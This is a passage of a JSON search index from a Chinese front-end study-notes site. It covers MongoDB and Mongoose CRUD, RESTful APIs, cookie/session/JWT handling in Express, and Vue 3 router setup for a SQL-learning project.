是一个基于分布式文件存储的数据库，官方地址：MongoDB\"]},{\"header\":\"1.2 数据库是什么\",\"slug\":\"_1-2-数据库是什么\",\"contents\":[\"数据库（DataBase）是按照数据结构来组织、存储和管理数据的应用程序\"]},{\"header\":\"1.3 数据库的作用\",\"slug\":\"_1-3-数据库的作用\",\"contents\":[\"数据库的主要作用就是管理数据，对数据进行增（c）、删（d）、改（u）、查（r）\"]},{\"header\":\"1.4 数据库管理数据的特点\",\"slug\":\"_1-4-数据库管理数据的特点\",\"contents\":[\"相比于纯文件管理数据，数据库管理数据有如下特点：\",\"速度更快\",\"扩展性更强\",\"安全性更强\"]},{\"header\":\"1.5 为什么选择Mongodb\",\"slug\":\"_1-5-为什么选择mongodb\",\"contents\":[\"操作语法与 JavaScript 类似，容易上手，学习成本低\"]},{\"header\":\"2. 核心概念\",\"slug\":\"_2-核心概念\",\"contents\":[\"Mongodb 中有三个重要概念需要掌握：\",\"数据库（database）：数据库是一个数据仓库，数据库服务下可以创建很多数据库，数据库中可以存放很多集合\",\"集合（collection）：集合类似于 JS 中的数组，在集合中可以存放很多文档\",\"文档（document）：文档是数据库中的最小单位，类似于 JS 中的对象\",\"JSON 文件示例：\",\"{ \\\"accounts\\\": [ { \\\"id\\\": \\\"3-YLju5f3\\\", \\\"title\\\": \\\"买电脑\\\", \\\"time\\\": \\\"2023-02-08\\\", \\\"type\\\": \\\"-1\\\", \\\"account\\\": \\\"5500\\\", \\\"remarks\\\": \\\"为了上网课\\\" }, { \\\"id\\\": \\\"3-YLju5f4\\\", \\\"title\\\": \\\"请女朋友吃饭\\\", \\\"time\\\": \\\"2023-02-08\\\", \\\"type\\\": \\\"-1\\\", \\\"account\\\": \\\"214\\\", \\\"remarks\\\": \\\"情人节聚餐\\\" }, { \\\"id\\\": \\\"mRQiD4s3K\\\", \\\"title\\\": \\\"发工资\\\", \\\"time\\\": \\\"2023-02-19\\\", \\\"type\\\": \\\"1\\\", \\\"account\\\": \\\"4396\\\", \\\"remarks\\\": \\\"终于发工资啦!~~\\\" } ], \\\"users\\\":[ { \\\"id\\\": 1, \\\"name\\\": \\\"zhangsan\\\", \\\"age\\\": 18 }, { \\\"id\\\": 2, \\\"name\\\": \\\"lisi\\\", \\\"age\\\": 20 }, { \\\"id\\\": 3, \\\"name\\\": \\\"wangwu\\\", \\\"age\\\": 22 } ] } \",\"大家可以通过 JSON 文件来理解 Mongodb 中的概念\",\"一个JSON文件好比是一个数据库，一个 Mongodb 服务下可以有 N 个数据库\",\"JSON 文件中的一级属性的数组值好比是集合\",\"数组中的对象好比是文档\",\"对象中的属性有时也称之为字段\",\"一般情况下：\",\"一个项目使用一个数据库\",\"一个集合会存储同一种类型的数据\"]},{\"header\":\"3. 下载安装与启动\",\"slug\":\"_3-下载安装与启动\",\"contents\":[\"下载地址：Download MongoDB Community Server\",\"建议选择 zip 类型， 通用性更强\",\"配置步骤如下：\",\"将压缩包移动到安装目录下，然后解压\",\"创建\\\\data\\\\db目录，mongodb 会将数据默认保存在这个文件夹\",\"以 mongodb 中 bin 目录作为工作目录，启动命令行\",\"运行命令mongod --dbpath /data/db目录的路径\",\"看到最后的 waiting for connections 则表明服务已经启动成功\",\"然后可以使用 mongo 命令连接本机的 mongodb 服务\"]},{\"header\":\"4. 命令行交互\",\"slug\":\"_4-命令行交互\",\"contents\":[\"命令行交互一般是学习数据库的第一步，不过这些命令在后续用的比较少，了解即可\"]},{\"header\":\"4.1 数据库命令\",\"slug\":\"_4-1-数据库命令\",\"contents\":[\"显示所有的数据库\",\"show dbs \",\"切换到指定的数据库，如果数据库不存在会自动创建数据库\",\"use 数据库名 \",\"显示当前所在的数据库\",\"db \",\"删除当前数据库\",\"use 库名 db.dropDatabase() \"]},{\"header\":\"4.2 集合命令\",\"slug\":\"_4-2-集合命令\",\"contents\":[\"创建集合\",\"db.createCollection('集合名称') \",\"显示当前数据库中的所有集合\",\"show collections \",\"删除某个集合\",\"db.集合名.drop() \",\"重命名集合\",\"db.集合名.renameCollection('newName') \"]},{\"header\":\"4.3 文档命令\",\"slug\":\"_4-3-文档命令\",\"contents\":[\"插入文档\",\"db.集合名.insert(文档对象) \",\"查询文档\",\"db.集合名.find(查询条件) \",\"_id 是 mongodb 自动生成的唯一编号，用来唯一标识文档\",\"更新文档\",\"db.集合名.update(查询条件,新的文档) db.集合名.update({name:'张三'},{$set:{age:19}}) \",\"删除文档\",\"db.集合名.remove(查询条件) \"]},{\"header\":\"5. Mongoose\",\"slug\":\"_5-mongoose\",\"contents\":[\"Mongoose 是一个对象文档模型库，官网：Mongoose.js中文网 \"]},{\"header\":\"5.1 作用\",\"slug\":\"_5-1-作用\",\"contents\":[\"方便使用代码操作 mongodb 数据库\"]},{\"header\":\"5.2 使用流程\",\"slug\":\"_5-2-使用流程\",\"contents\":[\" //1. 安装 mongoose：npm i mongoose //2. 导入 mongoose const mongoose = require('mongoose') //3. 连接数据库 mongoose.connect('mongodb://127.0.0.1:27017/bilibili') // 这里的bilibili是数据库的名称 //4. 设置连接回调 //连接成功 once 一次 事件回调函数只执行一次 mongoose.connection.on('open', () => { console.log('连接成功'); //5. 创建文档结构对象 // 设置集合中文档的属性以及属性值得类型 let BookSchema = new mongoose.Schema({ title: String, author: String, price: Number }) //6. 创建文档模型对象 对文档操作的封装对象 mongoose会使用集合名称的复数，创建集合 let BookModel = mongoose.model('book', BookSchema) //7. 插入文档 BookModel.create({ name: '西游记', author: '吴承恩', price:19.9 }).then(data => { console.log(data) // 8. 断开连接 关闭数据连接（项目运行过程中，不会添加该代码） mongoose.disconnect() }).catch(err => { console.log(err) }) console.log('连接成功') }) //连接出错 mongoose.connection.on('error', () => { console.log('连接出错~~') }) //连接关闭 mongoose.connection.on('close', () => { console.log('连接关闭') }) \"]},{\"header\":\"5.3 字段类型\",\"slug\":\"_5-3-字段类型\",\"contents\":[\"文档结构可选的常用字段类型列表\",\"类型\",\"描述\",\"String\",\"字符串\",\"Number\",\"数字\",\"Boolean\",\"布尔值\",\"Array\",\"数组，也可以使用 [] 来标识\",\"Date\",\"日期\",\"Buffer\",\"Buffer 对象\",\"Mixed\",\"任意类型，需要使用 mongoose.Schema.Types.Mixed 指定\",\"ObjectId\",\"对象 ID，需要使用 mongoose.Schema.Types.ObjectId 指定\",\"Decimal128\",\"高精度数字，需要使用 mongoose.Schema.Types.Decimal128 指定\"]},{\"header\":\"5.4 字段值验证\",\"slug\":\"_5-4-字段值验证\",\"contents\":[\"Mongoose 有一些内建验证器，可以对字段值进行验证\",\"必填项\",\"title: { type: String, required: true // 设置必填项 }, \",\"默认值\",\"author: { type: String, default: '匿名' //默认值 }, \",\"枚举值\",\"gender: { type: String, enum: ['男','女'] //设置的值必须是数组中的 }, \",\"唯一值\",\"username: { type: String, unique: true }, \",\"unique 需要 重建集合 才能有效果\"]},{\"header\":\"5.5 CRUD\",\"slug\":\"_5-5-crud\",\"contents\":[\"数据库的基本操作包括四个，增加（create），删除（delete），修改（update），查（read）\"]},{\"header\":\"5.5.1 增加\",\"slug\":\"_5-5-1-增加\",\"contents\":[\"插入一条：\",\"SongModel.create({ title:'给我一首歌的时间', author: 'Jay' }, function(err, data){ //错误 console.log(err) //插入后的数据对象 console.log(data) }) \",\"批量插入：\",\"//1.引入mongoose const mongoose = require('mongoose') //2.链接mongodb数据库 connect 连接 mongoose.connect('mongodb://127.0.0.1:27017/project') //3.设置连接的回调 mongoose.connection.on('open',()=>{ //4.声明文档结构 const PhoneSchema = new mongoose.Schema({ brand:String, color:String, price:Number, tags:Array }) //6.创建模型对象 const PhoneModel = mongoose.model('phone',PhoneSchema); PhoneModel.insertMany([ { brand:'华为', color:'灰色', price:2399, tags:['电量大','屏幕大','信号好'] }, { brand:'小米', color:'白色', price:2099, tags:['电量大','屏幕大','信号好'] } ],(err,data)=>{ if(err) throw err console.log('写入成功') mongoose.connection.close() }) }) \"]},{\"header\":\"5.5.2 删除\",\"slug\":\"_5-5-2-删除\",\"contents\":[\"删除一条数据：\",\"SongModel.deleteOne({_id:'5dd65f32be6401035cb5b1ed'}, function(err){ if(err) throw err console.log('删除成功') mongoose.connection.close() }) \",\"批量删除：\",\"SongModel.deleteMany({author:'Jay'}, function(err){ if(err) throw err console.log('删除成功') mongoose.connection.close() }) \"]},{\"header\":\"5.5.3 更新\",\"slug\":\"_5-5-3-更新\",\"contents\":[\"更新一条数据：\",\"SongModel.updateOne({author: 'JJ Lin'}, {author: '林俊杰'}, function (err) { if(err) throw err mongoose.connection.close() }) \",\"批量更新数据：\",\"SongModel.updateMany({author: 'Leehom Wang'}, {author: '王力宏'}, function (err) { if(err) throw err mongoose.connection.close() }) \"]},{\"header\":\"5.5.4 查询\",\"slug\":\"_5-5-4-查询\",\"contents\":[\"查询一条数据：\",\"SongModel.findOne({author: '王力宏'}, function(err, data){ if(err) throw err console.log(data) mongoose.connection.close() }) //根据 id 查询数据 SongModel.findById('5dd662b5381fc316b44ce167',function(err, data){ if(err) throw err console.log(data) mongoose.connection.close() }) \",\"批量查询数据：\",\"//不加条件查询 SongModel.find(function(err, data){ if(err) throw err console.log(data) mongoose.connection.close() }) //加条件查询 SongModel.find({author: '王力宏'}, function(err, data){ if(err) throw err console.log(data) mongoose.connection.close() }) \"]},{\"header\":\"5.6 条件控制\",\"slug\":\"_5-6-条件控制\",\"contents\":[]},{\"header\":\"5.6.1 运算符\",\"slug\":\"_5-6-1-运算符\",\"contents\":[\"在 mongodb 不能使用 > < >= <= !== 等运算符，需要使用替代符号\",\">使用 $gt\",\"< 使用 $lt\",\"= 使用 $gte\",\"<= 使用 $lte\",\"!== 使用 $ne\",\"//id号比3大的所有的记录 db.students.find({id:{$gt:3}}) // 价格小于 20 的图书 BookModel.find({ price: { $lt: 20 } }, (err, data) => { if (err) { console.log('读取失败~~~') return } console.log(data) }) \"]},{\"header\":\"5.6.2 逻辑运算\",\"slug\":\"_5-6-2-逻辑运算\",\"contents\":[\"$or 逻辑或的情况\",\"db.students.find({$or:[{age:18},{age:24}]}) // 曹雪芹 或者 余华的书 BookModel.find({ $or: [{ author: '曹雪芹' }, { author: '余华' }] }, (err, data)=>{ if (err) { console.log('读取失败~~~') return } console.log(data) }) \",\"$and 逻辑与的情况\",\"db.students.find({$and: [{age: {$lt:20}}, {age: {$gt: 15}}]}) // 价格大于 30 且 小于 70 BookModel.find({ $and: [{ price: { $gt: 30 } }, { price: { $lt: 70 } }] }, (err, data) => { if (err) { console.log('读取失败~~~') return } console.log(data) }) \"]},{\"header\":\"5.6.3 正则匹配\",\"slug\":\"_5-6-3-正则匹配\",\"contents\":[\"条件中可以直接使用 JS 的正则语法，通过正则可以进行模糊查询\",\"db.students.find({name:/imissyou/}) 正则表达式，搜索书籍名称中带有 '三' 的图书 BookModel.find({ name: /三/ }, (err, data) => { if (err) { console.log('读取失败~~~') return } console.log(data) }) BookModel.find({ name: new RegExp('三') }, (err, data) => { if (err) { console.log('读取失败~~~') return } console.log(data) }) \"]},{\"header\":\"5.7 个性化读取\",\"slug\":\"_5-7-个性化读取\",\"contents\":[]},{\"header\":\"5.7.1 字段筛选\",\"slug\":\"_5-7-1-字段筛选\",\"contents\":[\"//0:不要的字段 //1:要的字段 SongModel.find().select({_id:0,title:1}).exec(function(err,data){ if(err) throw err console.log(data) mongoose.connection.close() }) \"]},{\"header\":\"5.7.2 数据排序\",\"slug\":\"_5-7-2-数据排序\",\"contents\":[\"// sort 排序 // 1:升序 // -1:倒序 SongModel.find().sort({hot:1}).exec(function(err,data){ if(err) throw err console.log(data) mongoose.connection.close() }) \"]},{\"header\":\"5.7.3 数据截取\",\"slug\":\"_5-7-3-数据截取\",\"contents\":[\"//skip 跳过 limit 限定 SongModel.find().skip(10).limit(10).exec(function(err,data){ if(err) throw err console.log(data) mongoose.connection.close() }) \"]},{\"header\":\"6. 图形化管理工具\",\"slug\":\"_6-图形化管理工具\",\"contents\":[\"我们可以使用图形化的管理工具来对 Mongodb 进行交互，这里演示两个图形化工具\",\"Robo 3T 免费：Releases · Studio3T/robomongo\",\"Navicat 收费：Navicat\"]}]},\"/front-end/nodejs-notes/11-NodeJS-%E6%8E%A5%E5%8F%A3.html\":{\"title\":\"接口\",\"contents\":[{\"header\":\"1. 简介\",\"slug\":\"_1-简介\",\"contents\":[]},{\"header\":\"1.1 接口是什么\",\"slug\":\"_1-1-接口是什么\",\"contents\":[\"接口是前后端通信的桥梁\",\"简单理解：一个接口就是服务中的一个路由规则，根据请求响应结果\",\"接口的英文单词是 API (Application Program Interface)，所以有时也称之为API 接口\",\"这里的接口指的是数据接口，与编程语言（Java，Go 等）中的接口语法不同\"]},{\"header\":\"1.2 接口的作用\",\"slug\":\"_1-2-接口的作用\",\"contents\":[\"实现前后端通信\"]},{\"header\":\"1.3 接口的开发与调用\",\"slug\":\"_1-3-接口的开发与调用\",\"contents\":[\"大多数接口都是由后端工程师开发的，开发语言不限\",\"一般情况下接口都是由前端工程师调用的，但有时后端工程师也会调用接口，比如短信接口，支付接口等\"]},{\"header\":\"1.4 接口的组成\",\"slug\":\"_1-4-接口的组成\",\"contents\":[\"一个接口一般由以下几个部分组成：\",\"请求方法\",\"接口地址（URL）\",\"请求参数\",\"响应结果\"]},{\"header\":\"2. RESTful API\",\"slug\":\"_2-restful-api\",\"contents\":[\"RESTful API 是一种特殊风格的接口，主要特点有如下几个：\",\"URL 中的路径表示资源，路径中不能有动词，例如create, delete,update等这些都不能有\",\"操作资源要与HTTP请求方法对应\",\"操作结果要与HTTP 响应状态码对应\",\"规则示例：\",\"操作\",\"请求类型\",\"URL\",\"返回\",\"新增歌曲\",\"POST\",\"/song\",\"返回新生成的歌曲信息\",\"删除歌曲\",\"DELETE\",\"/song/10\",\"返回一个空文档\",\"修改歌曲\",\"PUT\",\"/song/10\",\"返回更新后的歌曲信息\",\"修改歌曲\",\"PATCH\",\"/song/10\",\"返回更新后的歌曲信息\",\"获取所有歌曲\",\"GET\",\"/song\",\"返回歌曲列表数组\",\"获取单个歌曲\",\"GET\",\"/song/10\",\"返回单个歌曲信息\"]},{\"header\":\"3. json-server\",\"slug\":\"_3-json-server\",\"contents\":[\"json-server 本身是一个 JS 编写的工具包，可以快速搭建 RESTful API 服务\",\"官方地址：json-server\",\"操作步骤：\",\"全局安装 json-server\",\"npm i -g json-server \",\"创建 JSON 文件（db.json），编写基本结构\",\"{ \\\"song\\\": [ { \\\"id\\\": 1, \\\"name\\\": \\\"干杯\\\", \\\"singer\\\": \\\"五月天\\\" }, { \\\"id\\\": 2, \\\"name\\\": \\\"当\\\", \\\"singer\\\": \\\"动力火车\\\" }, { \\\"id\\\": 3, \\\"name\\\": \\\"不能说的秘密\\\", \\\"singer\\\": \\\"周杰伦\\\" } ] } \",\"以 JSON 文件所在文件夹作为工作目录，执行如下命令\",\"json-server --watch db.json \",\"默认监听端口为：3000\"]},{\"header\":\"4. 接口测试工具\",\"slug\":\"_4-接口测试工具\",\"contents\":[\"几个接口测试工具：\",\"apipost：Apipost\",\"apifox：Apifox\",\"postman：Postman\"]}]},\"/front-end/nodejs-notes/12-NodeJS-%E4%BC%9A%E8%AF%9D%E6%8E%A7%E5%88%B6.html\":{\"title\":\"会话控制\",\"contents\":[{\"header\":\"1. 介绍\",\"slug\":\"_1-介绍\",\"contents\":[\"所谓会话控制就是对会话进行控制\",\"HTTP 是一种无状态的协议，它没有办法区分多次的请求是否来自于同一个客户端，无法区分用户\",\"而产品中又大量存在的这样的需求，所以我们需要通过会话控制来解决该问题\",\"常见的会话控制技术有三种：\",\"cookie\",\"session\",\"token\"]},{\"header\":\"2. cookie\",\"slug\":\"_2-cookie\",\"contents\":[]},{\"header\":\"2.1 cookie是什么\",\"slug\":\"_2-1-cookie是什么\",\"contents\":[\"cookie 是 HTTP 服务器发送到用户浏览器并保存在本地的一小块数据\",\"cookie 是保存在浏览器端的一小块数据\",\"cookie 是按照域名划分保存的\",\"简单示例：\",\"域名\",\"cookie\",\"www.baidu.com\",\"a=100;b=200\",\"www.bilibili.com\",\"xid=1020abce121;hm=112411213\",\"jd.com\",\"x=100;ocw=12414cce\"]},{\"header\":\"2.2 cookie的特点\",\"slug\":\"_2-2-cookie的特点\",\"contents\":[\"浏览器向服务器发送请求时，会自动将当前域名下可用的 cookie 设置在请求头中，然后传递给服务器\",\"这个请求头的名字也叫 cookie ，所以将cookie理解为一个 HTTP 的请求头也是可以的\"]},{\"header\":\"2.3 cookie的运行流程\",\"slug\":\"_2-3-cookie的运行流程\",\"contents\":[\"填写账号和密码校验身份，校验通过后下发 cookie\",\"有了 cookie 之后，后续向服务器发送请求时，就会自动携带 cookie\"]},{\"header\":\"2.4 浏览器操作cookie\",\"slug\":\"_2-4-浏览器操作cookie\",\"contents\":[\"浏览器操作 cookie 的操作，使用相对较少，大家了解即可\",\"禁用所有 cookie\",\"删除 cookie\",\"查看 cookie\"]},{\"header\":\"2.5 cookie的代码操作\",\"slug\":\"_2-5-cookie的代码操作\",\"contents\":[\"express 中可以使用 cookie-parser 进行处理\",\"const express =require('express') //1. 安装 cookie-parser npm i cookie-parser //2. 引入 cookieParser 包 const cookieParser = require('cookie-parser') const app = express() //3. 设置 cookieParser 中间件 app.use(cookieParser()) //4-1 设置 cookie app.get('/set-cookie', (request, response) => { // 不带时效性 会在浏览器关闭的时候，销毁 response.cookie('username','wangwu') // 带时效性 response.cookie('email','23123456@qq.com', {maxAge: 5*60*1000 }) //响应 response.send('Cookie的设置') }) //4-2 读取 cookie app.get('/get-cookie', (request, response) => { //读取 cookie console.log(request.cookies) //响应体 response.send('Cookie的读取') }) //4-3 删除cookie app.get('/delete-cookie', (request, response) => { //删除 response.clearCookie('username') //响应 response.send('cookie 的清除') }) //4. 启动服务 app.listen(3000, () => { console.log('服务已经启动....') }) \",\"不同浏览器中的 cookie 是相互独立的，不共享\"]},{\"header\":\"3. session\",\"slug\":\"_3-session\",\"contents\":[]},{\"header\":\"3.1 session是什么\",\"slug\":\"_3-1-session是什么\",\"contents\":[\"session 是保存在服务器端的一块儿数据，保存当前访问用户的相关信息\"]},{\"header\":\"3.2 session的作用\",\"slug\":\"_3-2-session的作用\",\"contents\":[\"实现会话控制，可以识别用户的身份，快速获取当前用户的相关信息\"]},{\"header\":\"3.3 session运行流程\",\"slug\":\"_3-3-session运行流程\",\"contents\":[\"填写账号和密码校验身份，校验通过后创建session信息，然后将 session_id 的值通过响应头返回给浏览器\",\"有了cookie，下次发送请求时会自动携带cookie，服务器通过 cookie 中的 session_id 的值确定用户的身份\"]},{\"header\":\"session 的代码操作\",\"slug\":\"session-的代码操作\",\"contents\":[\"express 中可以使用 express-session 对 session 进行操作\",\"const express = require('express') //1. 安装包 npm i express-session connect-mongo //2. 引入 express-session connect-mongo const session = require(\\\"express-session\\\") const MongoStore = require('connect-mongo') const app = express() //3. 设置 session 的中间件 app.use(session({ name: 'sid', //设置cookie的name，默认值是：connect.sid secret: 'atguigu', //参与加密的字符串（又称签名） 加盐 saveUninitialized: false, //是否为每次请求都设置一个cookie用来存储session的id resave: true, //是否在每次请求时重新保存session store: MongoStore.create({ mongoUrl: 'mongodb://127.0.0.1:27017/project' //数据库的连接配置 }), cookie: { httpOnly: true, // 开启后前端无法通过 JS 操作 maxAge: 1000 * 300 // 这一条 是控制 sessionID 的过期时间的！！！ }, })) //创建 session session的设置 app.get('/login', (req, res) => { //设置session req.session.username = 'zhangsan' req.session.email = 'zhangsan@qq.com' res.send('登录成功') }) //获取 session app.get('/home', (req, res) => { console.log('session的信息') console.log(req.session.username) // 检测 session 是否存在用户数据 if (req.session.username) { res.send(`你好 ${req.session.username}`) }else{ res.send('登录 注册') } }) //销毁 session app.get('/logout', (req, res) => { //销毁session // res.send('设置session') req.session.destroy(() => { res.send('成功退出') }) }) app.listen(3000, () => { console.log('服务已经启动, 端口 ' + 3000 + ' 监听中...') }) \"]},{\"header\":\"4. session和cookie的区别\",\"slug\":\"_4-session和cookie的区别\",\"contents\":[\"cookie 和 session 的区别主要有如下几点：\",\"存在的位置\",\"cookie：浏览器端\",\"session：服务端\",\"安全性\",\"cookie 是以明文的方式存放在客户端的，安全性相对较低\",\"session 存放于服务器中，所以安全性 相对 较好\",\"网络传输量\",\"cookie 设置内容过多会增大报文体积， 会影响传输效率\",\"session 数据存储在服务器，只是通过 cookie 传递 id，所以不影响传输效率\",\"存储限制\",\"浏览器限制单个 cookie 保存的数据不能超过 4K ，且单个域名下的存储数量也有限制\",\"session 数据存储在服务器中，所以没有这些限制\"]},{\"header\":\"5. token\",\"slug\":\"_5-token\",\"contents\":[]},{\"header\":\"5.1 token是什么\",\"slug\":\"_5-1-token是什么\",\"contents\":[\"token 是服务端生成并返回给 HTTP 客户端的一串加密字符串， token 中保存着用户信息\",\"token 不属于 http 标准，完全由前后端协商而定，但 cookie 属于 http 标准\"]},{\"header\":\"5.2 token的作用\",\"slug\":\"_5-2-token的作用\",\"contents\":[\"实现会话控制，可以识别用户的身份，主要用于移动端 APP\"]},{\"header\":\"5.3 token的工作流程\",\"slug\":\"_5-3-token的工作流程\",\"contents\":[\"填写账号和密码校验身份，校验通过后响应 token，token 一般是在响应体中返回给客户端的\",\"后续发送请求时，需要手动将 token 添加在请求报文中(cookie是自动携带的)，一般是放在请求头中\"]},{\"header\":\"5.4 token的特点\",\"slug\":\"_5-4-token的特点\",\"contents\":[\"服务端压力更小\",\"数据存储在客户端\",\"相对更安全\",\"数据加密\",\"可以避免 CSRF（跨站请求伪造）\",\"扩展性更强\",\"服务间可以共享\",\"增加服务节点更简单\"]},{\"header\":\"5.5 JWT\",\"slug\":\"_5-5-jwt\",\"contents\":[\"JWT（JSON Web Token ）是目前最流行的跨域认证解决方案，可用于基于 token 的身份验证\",\"JWT 使 token 的生成与校验更规范\",\"我们可以使用 jsonwebtoken 包 来操作 token：\",\"//导入 jsonwebtokan const jwt = require('jsonwebtoken') //创建 token // jwt.sign(数据, 加密字符串, 配置对象) let token = jwt.sign({ username: 'zhangsan' }, 'atguigu', { expiresIn: 60 //单位是 秒 }) //解析 token // jwt.verify(token,加密字符串，回调函数) jwt.verify(token, 'atguigu', (err, data) => { if(err){ console.log('校验失败~~'); return } console.log(data);// { username: '张三', iat: (创建时间), exp:(过期时间)} }) \"]}]},\"/front-end/nodejs-notes/\":{\"title\":\"NodeJS笔记\",\"contents\":[]},\"/front-end/project-notes/01-BeatSQL%E9%A1%B9%E7%9B%AE.html\":{\"title\":\"BeatSQL项目\",\"contents\":[{\"header\":\"1. 引入normalize.css\",\"slug\":\"_1-引入normalize-css\",\"contents\":[\"在项目中引入normalize.css可以清楚默认样式\",\"方法：\",\"在Vue项目中安装normalize.css\",\"npm install normalize.css \",\"在项目的入口文件（如：main.js）中引入\",\"import 'normalize.css'; \"]},{\"header\":\"2. 网站SEO优化\",\"slug\":\"_2-网站seo优化\",\"contents\":[\"index.html：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <link rel=\\\"icon\\\" href=\\\"/public/logo.png\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>BeatSQL - SQL自学网站</title> <meta name=\\\"keywords\\\" content=\\\"SQL,数据库,数据分析,程序员,编程,SQL学习,SQL教程,MySQL,DB\\\" /> <meta name=\\\"description\\\" content=\\\"SQL自学网站\\\" /> </head> <body> <div id=\\\"app\\\"></div> <script type=\\\"module\\\" src=\\\"/src/main.js\\\"></script> </body> </html> \"]},{\"header\":\"3. 引入ant-design-vue\",\"slug\":\"_3-引入ant-design-vue\",\"contents\":[\"安装\",\"npm install ant-design-vue@next \",\"在入口文件main.js中全局完整注册\",\"import { createApp } from 'vue'; import Antd from 'ant-design-vue'; import App from './App'; import 'ant-design-vue/dist/reset.css'; const app = createApp(App); app.use(Antd).mount('#app'); \"]},{\"header\":\"4. 引入VueRouter\",\"slug\":\"_4-引入vuerouter\",\"contents\":[]},{\"header\":\"4.1 基本使用\",\"slug\":\"_4-1-基本使用\",\"contents\":[\"安装\",\"npm install vue-router@next \",\"在应用程序中创建一个新的路由文件，例如 router/index.js，并导入必要的依赖：\",\"import { createRouter, createWebHistory } from 'vue-router'; import Home from './views/Home.vue'; import About from './views/About.vue'; // 创建路由实例 const router = createRouter({ history: createWebHistory(), routes: [ { path: '/', component: Home, }, { path: '/about', component: About, }, ], }); export default router; \",\"我们创建了两个简单的路由页面：Home 和 About\",\"在 main.js 文件中，将路由实例与 Vue 应用程序进行关联：\",\"import { createApp } from 'vue'; import App from './App.vue'; import router from './router'; createApp(App) .use(router) .mount('#app'); \",\"在组件中使用 <router-view> 组件来显示当前路由对应的组件，并使用 <router-link> 组件来生成链接到不同路由的导航\",\"<template> <div> <router-link to=\\\"/\\\">Home</router-link> <router-link to=\\\"/about\\\">About</router-link> <router-view></router-view> </div> </template> \"]},{\"header\":\"4.2 VueRouter和组合式API\",\"slug\":\"_4-2-vuerouter和组合式api\",\"contents\":[\"因为我们在 setup 里面没有访问 this，所以我们不能再直接访问 this.$router 或 this.$route。作为替代，我们使用 useRouter 和 useRoute 函数：\",\"import { useRouter, useRoute } from 'vue-router' export default { setup() { const router = useRouter() const route = useRoute() function pushWithQuery(query) { router.push({ name: 'search', query: { ...route.query, ...query, }, }) } }, } \"]},{\"header\":\"4.3 项目的路由配置\",\"slug\":\"_4-3-项目的路由配置\",\"contents\":[\"import { createRouter, createWebHistory } from 'vue-router' import LearnPage from '../views/LearnPage.vue' import LevelsPage from '../views/LevelsPage.vue' import PlaygroundPage from '../views/PlaygroundPage.vue' const router = createRouter({ history: createWebHistory(), routes: [ { path: '/', component: LearnPage, redirect: '/learn', props: true, }, { path: '/learn/:levelKey?', component: LearnPage, props: true, }, { path: '/levels', component: LevelsPage, }, { path: '/playground', component: PlaygroundPage, }, ], }) export default router \",\"首先，通过 import 语句引入了 Vue Router 相关的模块和组件\",\"然后，通过 createRouter 函数创建了一个路由实例，并传入了一个包含路由配置的对象。其中，使用 createWebHistory() 创建了一个 Web 历史记录管理器，用于处理浏览器的导航\",\"在路由配置的 routes 字段中，定义了几个路由规则：\",\"'/' 路径对应的组件是 LearnPage，并且在访问根路径时重定向到 /learn 路径。props: true 表示将路由参数作为 props 传递给组件。\",\"'/learn/:levelKey?' 路径对应的组件也是 LearnPage，其中 :levelKey? 表示这是一个可选的路由参数，即可以通过 /learn 访问，也可以通过 /learn/someLevelKey 访问。同样，props: true 表示将路由参数作为 props 传递给组件。\",\"'/levels' 路径对应的组件是 LevelsPage，没有配置额外的 props。\",\"'/playground' 路径对应的组件是 PlaygroundPage，没有配置额外的 props。\",\"最后，通过 export default 导出了路由实例，以便在其他地方引入和使用该实例\"]},{\"header\":\"4.4 路由传参\",\"slug\":\"_4-4-路由传参\",\"contents\":[\"在 Vue 3 中，你可以使用路由的 params 或 query 来传递参数到目标组件。下面是两种常用的方式：\",\"使用 params 传递参数：\",\"在路由定义中，可以通过 props: true 来启用路由参数自动注入到组件的 props 中\",\"const routes = [ { path: '/user/:userId', name: 'User', component: UserComponent, props: true } ]; \",\"然后在接收参数的组件中，可以直接声明接收的 props 属性，并且路由参数会自动注入到这些 props 中。\",\"<template> <div> <h1>User ID: {{ userId }}</h1> </div> </template> <script> export default { props: ['userId'] }; </script> \",\"使用 query 传递参数：\",\"在路由跳转时，可以使用 router-link 或 router.push 来添加查询参数。\",\"<!-- 使用 router-link --> <router-link :to=\\\"{ path: '/user', query: { userId: '123' } }\\\">User</router-link> <!-- 使用 router.push --> <button @click=\\\"goToUser\\\">Go to User</button> <script> export default { methods: { goToUser() { this.$router.push({ path: '/user', query: { userId: '123' } }); } } }; </script> \",\"在接收参数的组件中，可以使用 $route.query 来获取查询参数。\",\"<template> <div> <h1>User ID: {{ $route.query.userId }}</h1> </div> </template> \",\"这两种方式可以根据你的需求来选择适合的方法来传递参数到目标组件。注意，使用 params 传递参数时，参数会作为路由路径的一部分，而使用 query 传递参数时，参数会以查询字符串的形式出现在 URL 中。\"]},{\"header\":\"5. Ant Design Vue踩坑记录\",\"slug\":\"_5-ant-design-vue踩坑记录\",\"contents\":[\"Menu导航菜单高亮效果没有出现，原因是在 Vue Router 中，路由的 path 和菜单项的 key 需要保持一致才能正确地匹配并高亮显示菜单项\",\"在你之前的代码中，你给菜单项的 key 设置的是没有前面的 /，所以导致了路径匹配不上，菜单项无法正确高亮显示\",\"为了解决这个问题，你可以通过在菜单项的 key 前加上 / 来保持和路由的 path 一致。例如：\",\"const items = ref([ { key: '/learn', label: '学习', title: '学习' }, { key: '/levels', label: '关卡', title: '关卡' }, { key: '/playground', label: '广场', title: '广场' } ]); \",\"这样，当路由的 path 与菜单项的 key 匹配时，菜单项就会被正确高亮显示了\",\"实现思路：\",\"<template> <a-menu mode=\\\"horizontal\\\" :items=\\\"items\\\" :style=\\\"{ lineHeight: '64px' }\\\" @click=\\\"clickMenu\\\" :selected-keys=\\\"selectedKeys\\\" /> </template> <script setup> import { computed, ref } from 'vue'; import { useRouter, useRoute } from 'vue-router'; const router = useRouter(); const route = useRoute(); const selectedKeys = computed(() => [route.path]) const items = ref([{ key: '/learn', label: '学习', title: '学习', }, { key: '/levels', label: '关卡', title: '关卡', }, { key: '/playground', label: '广场', title: '广场', }]); // 点击菜单触发菜单切换 const clickMenu = ({ item, key, keyPath }) => { router.push(key) }; </script> \"]},{\"header\":\"6. 页面基本结构\",\"slug\":\"_6-页面基本结构\",\"contents\":[\"APP.vue\",\"<template> <a-row class=\\\"header\\\" type=\\\"flex\\\" align=\\\"middle\\\"> <a-col flex=\\\"160px\\\" style=\\\"margin: 0 auto;\\\"> <router-link to=\\\"/\\\"> <a-row align=\\\"middle\\\"> <img 